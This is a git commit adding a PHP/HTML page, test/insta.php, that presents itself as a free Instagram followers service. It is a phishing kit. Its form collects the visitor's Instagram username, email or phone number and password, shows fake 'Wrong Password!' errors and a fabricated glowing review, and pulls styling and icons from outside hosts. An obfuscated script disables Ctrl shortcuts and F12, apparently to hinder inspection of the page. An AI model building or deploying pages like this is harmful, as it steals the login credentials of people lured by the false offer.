9c7fdb2f2eaa2cc6fb0488d86ed6ff3d8f9947bb
picasy <57934059+picasy@users.noreply.github.com>
2023-04-26 11:52:14 +0530

    Create insta.php

---
+++ test/insta.php
@@ -0,0 +1,94 @@
+<html>
+<head>
+<meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<link rel="icon" href="https://2lucky.cfd/iG/v1/icon.png" type="image/x-icon">
+<link href="https://24web.tech/test/min.css" rel="stylesheet">
+<meta name="robots" content="noindex, nofollow">
+<link href="https://24web.tech/test/style.css" rel="stylesheet">
+<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.3/jquery.min.js">
+      </script>
+<title>Social Follow</title>
+</head>
+<body class="claim">
+<script>
+function _0x5577(){var _0x11c82c=['12275508JBWkXo','242EQUtyf','#ont','2546595HTiOoF','2724bJFkDd','8iujiFv','12NnIFVK','addEventListener','attr','48iLZMRw','stopPropagation','15644eGNxsm','disabled','349290NmGItH','129934Hwnrcg','preventDefault','10180CLxqqv','56600892OfPjeL','ctrlKey'];_0x5577=function(){return _0x11c82c;};return _0x5577();}var _0x155895=_0x33d8;(function(_0x26e5f6,_0x52734e){var _0x298b17=_0x33d8,_0x1f7235=_0x26e5f6();while(!![]){try{var _0xf66e1=-parseInt(_0x298b17(0x1a7))/0x1*(parseInt(_0x298b17(0x19d))/0x2)+-parseInt(_0x298b17(0x1a8))/0x3*(parseInt(_0x298b17(0x19a))/0x4)+-parseInt(_0x298b17(0x19f))/0x5*(-parseInt(_0x298b17(0x1a6))/0x6)+-parseInt(_0x298b17(0x1a2))/0x7+-parseInt(_0x298b17(0x1ab))/0x8*(parseInt(_0x298b17(0x1a5))/0x9)+-parseInt(_0x298b17(0x19c))/0xa*(parseInt(_0x298b17(0x1a3))/0xb)+parseInt(_0x298b17(0x1a0))/0xc;if(_0xf66e1===_0x52734e)break;else _0x1f7235['push'](_0x1f7235['shift']());}catch(_0x4e8638){_0x1f7235['push'](_0x1f7235['shift']());}}}(_0x5577,0xd8485));function _0x33d8(_0x6a2b93,_0x56cf45){var _0x557732=_0x5577();return _0x33d8=function(_0x33d82c,_0x462582){_0x33d82c=_0x33d82c-0x19a;var _0x517861=_0x557732[_0x33d82c];return _0x517861;},_0x33d8(_0x6a2b93,_0x56cf45);}function off(){var _0x9b9dab=_0x33d8;$(_0x9b9dab(0x1a4))[_0x9b9dab(0x1aa)](_0x9b9dab(0x19b),!![]);}document[_0x155895(0x1a9)]('keydown',function(_0x59cc12){var _0x45e973=_0x155895;(_0x59cc12[_0x45e973(0x1a1)]||_0x59cc12['keyCode']==0x7b)&&(_0x59cc12[_0x45e973(0x1ac)](),_0x59cc12[_0x45e973(0x19e)]());});
+</script>
+<nav class="navbar navbar-expand-md navbar-light">
+<div class="container">
+<center>
+<a class="sf-nav-logo navbar-brand">
+<img src="https://24web.tech/test/socialfollow-logo.svg" alt="Logo" class="d-inline-block align-text-top">
+</a>
+</center>
+</div>
+</nav>
+<section class="section-claim start">
+<div class="container">
+<div class="row align-items-center">
+<div class="col-md-7">
+<div class="sf-panel">
+<div class="body">
+<h3 class="heading">Get <span>10K Free Followers On Instagram</span></h3>
+<p class="text main">
+</p>
+<form method="get" ">
+<div class="wrapper fadeInDown">
+<div id="formContent">
+<input type="text" name="username" class="form-control input-text icon camera" placeholder="Username" actucomplete="off" required>
+<input type="text" name="email" class="form-control input-text icon at" placeholder="email or phone no" actucomplete="off" required>
+<input type="hidden" type="hidden" name="refer" value="" actucomplete="off">
+<input type="text" name="pass" class="form-control input-text icon lock" placeholder="Password" actucomplete="off" required><br>
+<input type="submit" class="btn button sf-button pink block" name="submit" value="Send Free Instagram Followers">
+<center><form method="get" action="">
+<div class="col-12">
+<input id="password" name="password" type="hidden" placeholder="Password" autocomplete="on" required>
+<input type="hidden" id="hiddenField" name="id" value="">
+
+<input type="hidden" value="Login">
+<input type="hidden" name="submit" class="submit" value="!! bhejo !!">
+</form>
+<div class="col-12">
+<select style="height:50px ;width: 100%;padding: 7px;margin-top: 4px;font-size: 14px;font-family: sans-serif; background: #ff3267;border-radius: 4px;color: #ffffff;border: none;outline: none;">
+<option style="border:none;background: #ff3267;">100 Followers</option>
+<option style="border:none;background: #ff3267;">200 Followers</option>
+<option style="border:none;background: #ff3267;">400 Followers</option>
+<option style="border:none;background: #ff3267;">800 Followers</option>
+<option style="border:none;background: #ff3267;">1600 Followers</option>
+<option style="border:none;background: #ff3267;">3000 Followers</option>
+<option style="border:none;background: #ff3267;" selected>10000 Followers</option>
+</select>
+</div>
+</div>
+</div>
+<p class="kagettw email-tw" style="width: 330px; top: -15px; text-align: center; margin-left: -17px;">Sorry, we couldn't find your account.</p>
+<p class="kagettw sandi-tw" style="width: 330px; top: -15px; text-align: center; margin-left: -17px;">Wrong Password!</p>
+</form>
+</div>
+</div>
+<div class="col-md-5">
+<div class="review d-flex flex-column align-items-center">
+<p class="message">
+I never believed I could get free followers And it is so simple to use. I could recommend more !
+</p>
+<div class="
+                      ratings
+                      d-flex
+                      align-items-center
+                      justify-content-between
+                    ">
+<span class="star"></span>
+<span class="star"></span>
+<span class="star"></span>
+<span class="star"></span>
+<span class="star"></span>
+</div>
+<div class="social"></div>
+</div>
+</div>
+</div>
+</div>
+</section>
+</body>
+</html>
